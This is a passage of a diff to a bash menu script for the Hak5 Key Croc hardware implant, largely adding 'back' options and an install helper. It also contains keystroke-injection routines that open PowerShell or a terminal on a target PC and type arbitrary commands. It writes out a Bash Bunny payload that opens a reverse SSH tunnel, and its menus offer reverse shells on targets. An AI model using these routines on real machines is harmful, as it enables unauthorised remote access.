-	[nN] | [nN][oO])
-		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
-	*)
-		invalid_entry ; mc_install ;;
-	esac
-else
-		echo -ne "\n$(ColorGreen 'MIDNIGHT COMMANDER IS INSTALLED')\n"
-fi
+	install_package mc MIDNIGHT_COMMANDER mc_install croc_edit_menu
 }
 ##
 #----midnight remove function
@@ -4159,6 +4135,7 @@ MenuEnd
 	3) mc ; midnight_manager ;;
 	4) main_menu ;;
 	0) exit 0 ;;
+	[bB]) croc_edit_menu ;;
 	*) invalid_entry ; midnight_manager ;;
 	esac
 }
@@ -4176,68 +4153,68 @@ insert_quack() {
 	case $r_a in
 	[yY] | [yY][eE][sS])
 if [ "$(OS_CHECK)" = WINDOWS ]; then
-		read_all ENTER COMMAND AND/OR WORD TO QUACK AND PRESS [ENTER]
-		Q GUI d
-		Q GUI r
-		sleep 1
-		Q STRING "powershell"
-		Q ENTER
-		sleep 2
-		Q STRING "${r_a}"
-		Q ENTER 
-		sleep 5
-		Q STRING "exit"
-		Q ENTER
-		Q ALT-TAB
+	read_all ENTER COMMAND AND/OR WORD TO QUACK AND PRESS [ENTER]
+	Q GUI d
+	Q GUI r
+	sleep 1
+	Q STRING "powershell"
+	Q ENTER
+	sleep 2
+	Q STRING "${r_a}"
+	Q ENTER 
+	sleep 5
+	Q STRING "exit"
+	Q ENTER
+	Q ALT-TAB
 else
-	case $HOST_CHECK in
-	raspberrypi)
-		read_all ENTER COMMAND AND/OR WORD TO QUACK AND PRESS [ENTER]
-		Q GUI d
-		sleep 1
-		Q STRING "LXTerminal"
-		Q ENTER
-		Q ENTER
-		sleep 1
-		Q STRING "${r_a}"
-		Q ENTER 
-		sleep 5
-		Q STRING "exit"
-		Q ENTER
-		Q ALT-TAB ;;
-	parrot)
-		read_all ENTER COMMAND AND/OR WORD TO QUACK AND PRESS [ENTER]
-		Q ALT F2
-		sleep 1
-		Q STRING "mate-terminal"
-		Q ENTER
-		sleep 1
-		Q STRING "${r_a}"
-		Q ENTER 
-		sleep 5
-		Q STRING "exit"
-		Q ENTER
-		Q ALT-TAB ;;
-	*)
-		read_all ENTER COMMAND AND/OR WORD TO QUACK AND PRESS [ENTER]
-		Q ALT F2
-		sleep 1
-		Q STRING "xterm"
-		Q ENTER
-		sleep 1
-		Q STRING "${r_a}"
-		Q ENTER 
-		sleep 5
-		Q STRING "exit"
-		Q ENTER
-		Q ALT-TAB ;;
-	esac
+case $HOST_CHECK in
+raspberrypi)
+	read_all ENTER COMMAND AND/OR WORD TO QUACK AND PRESS [ENTER]
+	Q GUI d
+	sleep 1
+	Q STRING "LXTerminal"
+	Q ENTER
+	Q ENTER
+	sleep 1
+	Q STRING "${r_a}"
+	Q ENTER 
+	sleep 5
+	Q STRING "exit"
+	Q ENTER
+	Q ALT-TAB ;;
+parrot)
+	read_all ENTER COMMAND AND/OR WORD TO QUACK AND PRESS [ENTER]
+	Q ALT F2
+	sleep 1
+	Q STRING "mate-terminal"
+	Q ENTER
+	sleep 1
+	Q STRING "${r_a}"
+	Q ENTER 
+	sleep 5
+	Q STRING "exit"
+	Q ENTER
+	Q ALT-TAB ;;
+*)
+	read_all ENTER COMMAND AND/OR WORD TO QUACK AND PRESS [ENTER]
+	Q ALT F2
+	sleep 1
+	Q STRING "xterm"
+	Q ENTER
+	sleep 1
+	Q STRING "${r_a}"
+	Q ENTER 
+	sleep 5
+	Q STRING "exit"
+	Q ENTER
+	Q ALT-TAB ;;
+esac
 fi ;;
-	[nN] | [nN][oO])
-		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
-	*)
-		invalid_entry ; insert_quack ;;
-	esac
+[nN] | [nN][oO])
+	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
+*)
+	invalid_entry ; insert_quack ;;
+esac
 }
 ##
 #----Croc Edit Menu
@@ -4271,6 +4248,7 @@ MenuEnd
 	11) insert_quack ; croc_edit_menu ;;
 	12) main_menu ;;
 	0) exit 0 ;;
+	[bB]) main_menu ;;
 	*) invalid_entry ; croc_edit_menu ;;
 	esac
 }
@@ -4283,18 +4261,7 @@ function ssh_menu() {
 ##
 #----SSH Install sshpass 
 ##
-local status="$(dpkg-query -W --showformat='${db:Status-Status}' "sshpass" 2>&1)"
-if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
-read_all INSTALL SSHPASS Y/N AND PRESS [ENTER]
-case $r_a in
-[yY] | [yY][eE][sS])
-	apt -y install sshpass ;;
-[nN] | [nN][oO])
-	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
-*)
-	invalid_entry ; ssh_menu ;;
-esac
-fi
+	install_package sshpass SSHPASS ssh_menu 
 #
 # Validate IP v4 or v6 address and start ssh to hak5 device
 #
@@ -4310,11 +4277,11 @@ fi
 #----SSH check devices for connection
 ##
 check_device() {
-if ping -q -c1 -w 1 ${1} &>/dev/null 2>&1; then
-	echo -ne "${yellow}${2} ${3} ${clear}${green}ONLINE IP:${1} ${clear}${4} ${5}" 2> /dev/null
+if ping -q -c 1 -w 1 ${1} &>/dev/null 2>&1; then
+	echo -ne "${yellow}${2} ${3} ${clear}${green}ONLINE IP:${1} ${clear}${4} ${5}"
 else
-	echo -ne "${yellow}${2} ${3} ${clear}${red}NOT CONNECTED OR CAN'T BE REACHED ${clear}" 2> /dev/null
-fi
+	echo -ne "${yellow}${2} ${3} ${clear}${red}NOT CONNECTED OR CAN'T BE REACHED ${clear}"
+fi 2> /dev/null
 }
 ##
 #----SSH shark jack get ip from Croc_Pot_Payload
@@ -4327,7 +4294,7 @@ if [ -e ${SHARK_IP} ]; then
 else
 		IP_F=172.16.24.1
 	fi
-fi
+fi 2> /dev/null
 }
 ##
 #----SSH owl get ip from mac
@@ -4352,10 +4319,10 @@ public_ip() {
 port_check() {
 nc -z -v -w 1 ${1} 22 &>/dev/null 2>&1
 if [[ "$?" -ne 0 ]]; then
-	echo -ne "${yellow} Port:${clear}${red}22 closed${clear}\n" 2> /dev/null
+	echo -ne "${yellow} Port:${clear}${red}22 closed${clear}\n"
 elif [[ "${#args[@]}" -eq 0 ]]; then
-	echo -ne "${yellow} Port:${clear}${green}22 open${clear}\n" 2> /dev/null
-fi
+	echo -ne "${yellow} Port:${clear}${green}22 open${clear}\n"
+fi 2> /dev/null
 }
 ##
 #----SSH get mac addresses
@@ -4364,10 +4331,14 @@ get_mac () {
 	echo -ne "${yellow}MAC:${clear}${green}$(arp -n ${1} | awk '/'${1}'/{print $3}' | sed -e 's/HWaddress//g') ${clear}"
 }
 squirrel_mac() {
+if [ -e "/root/udisk/tools/Croc_Pot/squirrel_mac.txt" ]; then
 	echo -ne "${yellow}MAC:${clear}${green}$(sed -n 1p /root/udisk/tools/Croc_Pot/squirrel_mac.txt) ${clear}"
+fi 2> /dev/null
 }
 turtle_mac() {
+if [ -e "/root/udisk/tools/Croc_Pot/turtle_mac.txt" ]; then
 	echo -ne "${yellow}MAC:${clear}${green}$(sed -n 1p /root/udisk/tools/Croc_Pot/turtle_mac.txt) ${clear}"
+fi 2> /dev/null
 }
 bunny_mac() {
 if [ "$(OS_CHECK)" = WINDOWS ]; then
@@ -4375,17 +4346,22 @@ if [ "$(OS_CHECK)" = WINDOWS ]; then
 	local bunny_v=$(sed -n 1p /root/udisk/tools/Croc_pot/bunny_mac.txt)
 elif [ "$(OS_CHECK)" = LINUX ]; then
 	local bunny_v=$(sed -n 1p /root/udisk/tools/Croc_pot/bunny_mac.txt)
-fi
+fi 2> /dev/null
 if [[ "$(sed -n 1p /root/udisk/tools/Croc_pot/bunny_mac.txt)" =~ ^([[:xdigit:]][[:xdigit:]]:){5}[[:xdigit:]][[:xdigit:]]$ ]]; then
 	echo -ne "${yellow}BASH BUNNY:${clear}${green} ONLINE IP: 172.16.64.1${clear}${yellow} MAC:${clear}${green} ${bunny_v}${clear}\n"
 else
 	echo -ne "${yellow}BASH BUNNY:${clear}${red} NOT CONNECTED OR CAN'T BE REACHED${clear}\n"
-fi
+fi 2> /dev/null
 }
+##
+#----SSH check for save VPS server
+##
+if [ -e "/root/udisk/tools/Croc_Pot/saved_shell.txt" ]; then
+	remote_vps=$(sed -n 1p /root/udisk/tools/Croc_Pot/saved_shell.txt)
+fi 2> /dev/null
 ##
 #----SSH display info screen
 ##
-	remote_vps=$(sed -n 1p /root/udisk/tools/Croc_Pot/saved_shell.txt)
 	echo -ne "$(Info_Screen '-SSH into HAK5 gear & TARGET PC
 -Reverse ssh tunnel, Create SSH Public/Private Key
 -Ensure devices are connected to the same local network As keycroc')\n"
@@ -4415,16 +4391,16 @@ else
 	ssh -o "StrictHostKeyChecking no" $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip)
 fi
 }
-	case $(OS_CHECK) in
-	WINDOWS)
-		start_ssh ;;
-	LINUX)
-		start_ssh ;;
-	MACOS)
-		echo -ne "\t$(ColorRed 'SORRY NO SUPPORT AT THIS TIME FOR MAC USERS')\n" ;;
-	*)
-		echo -ne "\t$(ColorRed 'SORRY DID NOT FIND VALID OS')\n" ;;
-	esac
+case $(OS_CHECK) in
+WINDOWS)
+	start_ssh ;;
+LINUX)
+	start_ssh ;;
+MACOS)
+	echo -ne "\t$(ColorRed 'SORRY NO SUPPORT AT THIS TIME FOR MAC USERS')\n" ;;
+*)
+	echo -ne "\t$(ColorRed 'SORRY DID NOT FIND VALID OS')\n" ;;
+esac
 else
 	echo -ne "\t$(ColorYellow 'PLEASE RUN CROC_POT_PAYLOAD.TXT TO GET TARGET IP/USERNAME')\n"
 fi
@@ -4503,6 +4479,7 @@ MenuEnd
 	2) pine_web ; ssh_menu ;;
 	3) main_menu ;;
 	0) exit 0 ;;
+	[bB]) ssh_menu ;;
 	*) invalid_entry ; ssh_menu ;;
 	esac
 }
@@ -4562,70 +4539,70 @@ if [ -e "${bunny_payload_v}" ]; then
 	cat ${bunny_payload_v}
 	echo -ne "\n${green}Reverse shell payload already exists check tools/Bunny_Payload_Shell folder\n${clear}"
 	read_all WOULD YOU LIKE TO KEEP THIS SETUP Y/N AND PRESS [ENTER]
-	case $r_a in
-	[yY] | [yY][eE][sS])
-		echo -ne "\n$(ColorGreen 'Keeping existing Bunny_Payload_Shell')\n" ;;
-	[nN] | [nN][oO])
-		rm ${bunny_payload_v}
-		echo -ne "# Title:         Bash Bunny Payload\n# Description:   Reverse Tunnel to keycroc\n# Author:        Spywill\n# Version:       1.0
+case $r_a in
+[yY] | [yY][eE][sS])
+	echo -ne "\n$(ColorGreen 'Keeping existing Bunny_Payload_Shell')\n" ;;
+[nN] | [nN][oO])
+	rm ${bunny_payload_v}
+	echo -ne "# Title:         Bash Bunny Payload\n# Description:   Reverse Tunnel to keycroc\n# Author:        Spywill\n# Version:       1.0
 # Category:      Bash Bunny\n#\n#ATTACKMODE RNDIS_ETHERNET\nATTACKMODE ECM_ETHERNET\nsleep 10\nssh -fN -R 7000:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nLED ATTACK" | tee ${bunny_payload_v}
-		echo -ne "\n${green}Bunny Reverse Tunnel payload is created check tools/Bunny_Payload_Shell folder\n${clear}" ;;
-	*)
-		invalid_entry ; ssh_bunny ;;
-	esac
+	echo -ne "\n${green}Bunny Reverse Tunnel payload is created check tools/Bunny_Payload_Shell folder\n${clear}" ;;
+*)
+	invalid_entry ; ssh_bunny ;;
+esac
 else
-		echo -ne "# Title:         Bash Bunny Payload\n# Description:   Reverse Tunnel to keycroc\n# Author:        Spywill\n# Version:       1.0
+	echo -ne "# Title:         Bash Bunny Payload\n# Description:   Reverse Tunnel to keycroc\n# Author:        Spywill\n# Version:       1.0
 # Category:      Bash Bunny\n#\n#ATTACKMODE RNDIS_ETHERNET\nATTACKMODE ECM_ETHERNET\nsleep 10\nssh -fN -R 7000:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nLED ATTACK" | tee ${bunny_payload_v}
-		echo -ne "\n${green}Bunny Reverse shell payload is created check tools/Bunny_Payload_Shell folder\n${clear}"
+	echo -ne "\n${green}Bunny Reverse shell payload is created check tools/Bunny_Payload_Shell folder\n${clear}"
 fi
 ##
 #----bunny start ssh session with target pc to bash bunny
 ##
-	read_all START SSH WITH TARGET PC TO BUNNY Y/N AND PRESS [ENTER]
-	case $r_a in
-	[yY] | [yY][eE][sS])
+read_all START SSH WITH TARGET PC TO BUNNY Y/N AND PRESS [ENTER]
+case $r_a in
+[yY] | [yY][eE][sS])
 if [ "$(OS_CHECK)" = WINDOWS ]; then
-		Q GUI d
-		Q GUI r
-		sleep 1
-		Q STRING "powershell"
-		Q ENTER
-		sleep 2
-		Q STRING "ssh root@172.16.64.1"
-		Q ENTER
+	Q GUI d
+	Q GUI r
+	sleep 1
+	Q STRING "powershell"
+	Q ENTER
+	sleep 2
+	Q STRING "ssh root@172.16.64.1"
+	Q ENTER
 else
-	case $HOST_CHECK in
-	raspberrypi)
-		Q GUI d
-		sleep 1
-		Q STRING "LXTerminal"
-		Q ENTER
-		Q ENTER
-		sleep 1
-		Q STRING "ssh root@172.16.64.1"
-		Q ENTER ;;
-	parrot)
-		Q ALT F2
-		sleep 1
-		Q STRING "mate-terminal"
-		Q ENTER
-		sleep 1
-		Q STRING "ssh root@172.16.64.1"
-		Q ENTER ;;
-	*)
-		Q ALT F2
-		sleep 1
-		Q STRING "xterm"
-		Q ENTER
-		sleep 1
-		Q STRING "ssh root@172.16.64.1"
-		Q ENTER ;;
-	esac
+case $HOST_CHECK in
+raspberrypi)
+	Q GUI d
+	sleep 1
+	Q STRING "LXTerminal"
+	Q ENTER
+	Q ENTER
+	sleep 1
+	Q STRING "ssh root@172.16.64.1"
+	Q ENTER ;;
+parrot)
+	Q ALT F2
+	sleep 1
+	Q STRING "mate-terminal"
+	Q ENTER
+	sleep 1
+	Q STRING "ssh root@172.16.64.1"
+	Q ENTER ;;
+*)
+	Q ALT F2
+	sleep 1
+	Q STRING "xterm"
+	Q ENTER
+	sleep 1
+	Q STRING "ssh root@172.16.64.1"
+	Q ENTER ;;
+esac
 fi ;;
-	[nN] | [nN][oO])
-		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
-	*) invalid_entry ; ssh_bunny ;;
-	esac
+[nN] | [nN][oO])
+	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
+*) invalid_entry ; ssh_bunny ;;
+esac
 ##
 #----bunny start reverse shell bunny to keycroc
 ##
@@ -4999,6 +4976,7 @@ MenuEnd
 	7) target_command root localhost -p 7000 ; command_menu ;;
 	8) main_menu ;;
 	0) exit 0 ;;
+	[bB]) croc_reverse_shell ;;
 	*) invalid_entry ; remote_command ;;
 	esac
 }
@@ -5017,15 +4995,16 @@ MenuColor 6 REMOTE COMMANDS TARGETS ; echo -ne "  ${clear}\n"
 MenuColor 7 RETURN TO MAIN MENU ; echo -ne "      ${clear}\n"
 MenuEnd
 	case $m_a in
-	1) remote_listener ;;
-	2) croc_listener ;;
-	3) reverse_payload ;;
-	4) shell_pc ;;
-	5) ssh_tunnel ;;
+	1) remote_listener ; croc_reverse_shell ;;
+	2) croc_listener ; croc_reverse_shell ;;
+	3) reverse_payload ; croc_reverse_shell ;;
+	4) shell_pc ; croc_reverse_shell ;;
+	5) ssh_tunnel ; croc_reverse_shell ;;
 	6) remote_command ;;
 	7) main_menu ;;
 	0) exit 0 ;;
-	*) invalid_entry ; ssh_menu ;;
+	[bB]) ssh_menu ;;
+	*) invalid_entry ; croc_reverse_shell ;;
 	esac
 }
 ##
@@ -5076,6 +5055,7 @@ MenuEnd
 	13) remove_sshkey ; ssh_menu ;;
 	14) main_menu ;;
 	0) exit 0 ;;
+	[bB]) main_menu ;;
 	*) invalid_entry ; ssh_menu ;;
 	esac
 }
@@ -5215,7 +5195,7 @@ remove_croc_pot() {
 	echo -ne "$(ColorRed 'ARE YOU SURE TO REMOVE CROC_POT TYPE YES OR NO AND PRESS [ENTER]:')"; read CROC_POT_REMOVE
 case $CROC_POT_REMOVE in
 [yY] | [yY][eE][sS])
-	apt -y remove unzip openvpn mc nmon sshpass screenfetch whois dnsutils
+	apt -y remove unzip openvpn mc nmon sshpass screenfetch whois dnsutils sslscan
 	rm -r /var/hak5c2 /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot/Bunny_Payload_Shell /root/udisk/tools/Croc_Pot
 	rm /usr/local/bin/c2-3.1.2_armv7_linux /etc/systemd/system/hak5.service /root/udisk/payloads/Getonline_Linux.txt
 	rm /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk/payloads/Croc_Pot_Payload.txt
@@ -5227,8 +5207,7 @@ case $CROC_POT_REMOVE in
 	apt-get autoremove
 	exit 0 ;;
 [nN] | [nN][oO])
-	echo -e "\n$(ColorYellow 'Return Back to main menu')"
-	main_menu ;;
+	echo -e "\n$(ColorYellow 'Return Back to main menu')" ;;
 *)
 	invalid_entry ; remove_croc_pot
 esac
@@ -5244,11 +5223,9 @@ croc_update() {
 case $r_a in
 [yY] | [yY][eE][sS])
 	echo -ne "\n$(ColorGreen 'UPDATING AND UPGRADING THE KEYCROC PACKAGES')\n"
-	apt update && apt upgrade -y
-	main_menu ;;
+	apt update && apt upgrade -y ;;
 [nN] | [nN][oO])
-	echo -ne "\n$(ColorYellow 'RETURING BACK TO MENU')\n"
-	main_menu ;;
+	echo -ne "\n$(ColorYellow 'RETURING BACK TO MENU')\n" ;;
 *)
 	invalid_entry ; croc_update ;;
 esac
@@ -5352,6 +5329,7 @@ MenuEnd
 	2) reboot_pc ;;
 	3) main_menu ;;
 	0) exit 0 ;;
+	[bB]) croc_recovery ;;
 	*) invalid_entry ; reboot_shutdown ;;
 	esac
 }
@@ -5380,6 +5358,7 @@ MenuEnd
 	8) reboot_shutdown ; croc_recovery ;;
 	9) main_menu ;;
 	0) exit 0 ;;
+	[bB]) main_menu ;;
 	*) invalid_entry ; croc_recovery ;;
 	esac
 }
@@ -5388,14 +5367,14 @@ MenuEnd
 ##
 function hak_cloud() {
 	clear
-	echo -ne "$(Info_Screen '-Run HAK-5 Cloud C2 on the keycroc
+	echo -ne "$(Info_Screen '-Run HAK5 Cloud C2 on the keycroc
 -When running setup, maximize your screen to read Token keys properly
 -To get Token keys Run #3 RELOAD HAK5 C2 until the keys show up
 -May need to Unplug the keycroc plug back in and try again
--This will check to see if unzip is installed if not it will install it
+-This will check to see if unzip is installed if not install it
 -This will not start C2 on boot Next reboot run #4 RESTART HAK5 C2
--ON any device type in the keycroc IP into any web browser url, That is on the
-same network as the keycroc and connect to HAK5 C2')\n"
+-ON any device type in the keycroc IP into any web browser url,
+-Device must be on same network as the keycroc and then to connect HAK5 C2')\n"
 ##
 #----Hak5 Cloud_C2 install unzip
 ##
@@ -5503,10 +5482,10 @@ remove_cloud() {
 quick_cloud() {
 	local quickcloud=/root/udisk/payloads/Quick_Start_C2.txt
 	clear
-	echo -ne "$(Info_Screen '-Will need to install Cloud C2 frist
+	echo -ne "$(Info_Screen '-Will need to install Cloud C2 frist on the keycroc
 -This will install Quick_Start_C2.txt in the payload folder
 -Use this to start C2 from a payload
--Type in startc2 this will automatically start C2')\n"
+-Type in startc2 this will automatically start Hak5 cloud C2')\n"
 if [ -e "${quickcloud}" ]; then
 	echo -ne "\n$(ColorGreen 'Quick_Start_C2.txt already exist check payloads folder\n')"
 else
@@ -5621,6 +5600,7 @@ MenuEnd
 	3) edit_ip ; save_ip ;;
 	4) main_menu ;;
 	0) exit 0 ;;
+	[bB]) hak_cloud ;;
 	*) invalid_entry ; save_ip ;;
 	esac
 }
@@ -5650,6 +5630,7 @@ MenuEnd
 	8) quick_cloud ; hak_cloud ;;
 	9) save_ip ; hak_cloud ;;
 	10) main_menu ;;
+	[bB]) main_menu ;;
 	0) exit 0 ;;
 	*) invalid_entry ; hak_cloud ;;
 	esac
@@ -5665,7 +5646,7 @@ MenuTitle CROC POT MAIN MENU
 MenuColor 1 CROC MAIL ; echo -ne "     ${blue} ${array[4]} ${clear} \n"
 MenuColor 2 CROC POT PLUS ; echo -ne " ${red} ${array[5]} ${clear} \n"
 MenuColor 3 KEYCROC STATUS ; echo -ne "${green} ${array[6]} ${clear} \n"
-MenuColor 4 KEYCROC LOGS ; echo -ne "   ${array[7]} ${clear} \n"
+MenuColor 4 KEYCROC LOGS ; echo -ne "  ${white} ${array[7]} ${clear} \n"
 MenuColor 5 KEYCROC EDIT ; echo -ne "  ${yellow} ${array[8]} ${clear} \n"
 MenuColor 6 SSH MENU ; echo -ne "      ${blue} ${array[9]} ${clear} \n"
 MenuColor 7 RECOVERY MENU ; echo -ne " ${green} ${array[10]} ${clear} \n"
